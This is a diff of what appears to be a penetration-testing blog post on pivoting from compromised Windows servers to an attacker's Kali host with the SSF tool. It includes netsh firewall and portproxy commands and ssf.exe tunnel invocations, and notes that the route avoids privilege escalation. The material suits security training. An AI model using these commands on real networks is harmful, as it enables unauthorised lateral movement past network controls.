@@ -127,14 +127,15 @@
     [2021-03-02T02:23:25-08:00] [info] [ssfd] listening on <*:5000>
     [2021-03-02T02:23:25-08:00] [info] [ssfd] running (Ctrl + C to stop)
     </pre>
-            <p>And then you need to allow connection to the port 5000 by adding this firewall rules if the firewall is enabled. You can argue on the fact that we can simple use the netsh command and port forward the port 1338 from Server 1 to ou Kali, while this solution is more simple, you will always need administrative privileges even if the firewall is disabled. In our case, if the firewall is disabled we don't need administrative privileges. In any case you can also use the following command <code>netsh interface portproxy add v4tov4 listenport=1338 listenaddress=0.0.0.0 connectport=1338 connectaddress=192.168.133.156</code> and just reproduce the step 1 on Server 2.</p>
+    <p>And then you need to allow connection to the port 5000 by adding this firewall rules if the firewall is enabled.</p>
     
     <pre style="font-size:11px; background: #ffd9d9;">
     C:\Windows\system32>netsh advfirewall firewall add rule name="TCP Port 5000" dir=in action=allow protocol=TCP localport=5000
         Ok.
     </pre>
+            <p>You can argue on the fact that we can simple use the netsh command and port forward the port 1338 from Server 1 to our Kali, while this this true, you will always need administrative privileges even if the firewall is disabled. In our case, if the firewall is disabled we don't need administrative privileges anymore which can avoid to spend time to privesc on Server 1. <br> In any case, I'm currently using both option regarding the situation, so you can also use the following command <code>netsh interface portproxy add v4tov4 listenport=1338 listenaddress=0.0.0.0 connectport=1338 connectaddress=192.168.133.156</code> and just reproduce the step 1 on Server 2. </p>
     
-            <p>Then we need to configure a path to tell ssf on Server 2 to use the port 5000 on Server 1 to connect to our Kali since our Kali is only reacheable from Server 1. It's actually very simple, just add the following code in a file.</p>
+            <p>Then we need to configure a path to tell ssf on Server 2 to use the port 5000 on Server 1 to connect to our Kali since our Kali is only reachable from Server 1. It's actually very simple, just add the following code in a file.</p>
     <pre style="font-size:11px">
     C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>type config.txt
     {
@@ -161,6 +162,7 @@
     [2021-03-02T06:08:04-08:00] [info] [client] connected to server
     [2021-03-02T06:08:04-08:00] [info] [client] running
     </pre>
+    <p>With the <code>netsh</code> solution just run <code>.\ssf.exe -L 4443:192.168.133.156:4443 -p 1338 192.168.151.101 -F 1081</code></p>
                 <p>On our kali we should see this new line pop:</p>
     <pre style="font-size:11px">
     [2021-03-02T09:11:58-05:00] [info] [microservice] [stream_listener]: forward TCP connections from <127.0.0.1:1081> to 1081</pre>
